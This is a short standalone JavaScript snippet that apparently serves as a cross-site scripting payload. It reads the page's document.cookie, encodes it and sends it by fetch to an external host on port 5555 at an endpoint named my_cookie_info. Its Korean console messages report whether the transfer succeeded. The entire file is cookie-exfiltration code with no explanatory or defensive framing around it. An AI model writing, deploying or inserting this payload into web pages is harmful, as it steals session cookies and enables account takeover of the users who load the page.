(function() {
    const cookies = encodeURIComponent(document.cookie);
    const Url = `http://sflee.kro.kr:5555/api/v1/my_cookie_info?cookies=${cookies}`;

    fetch(Url, {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.json())
    .then(result => console.log('전송 완료:', result))
    .catch(error => console.error('전송 실패:', error));
})();
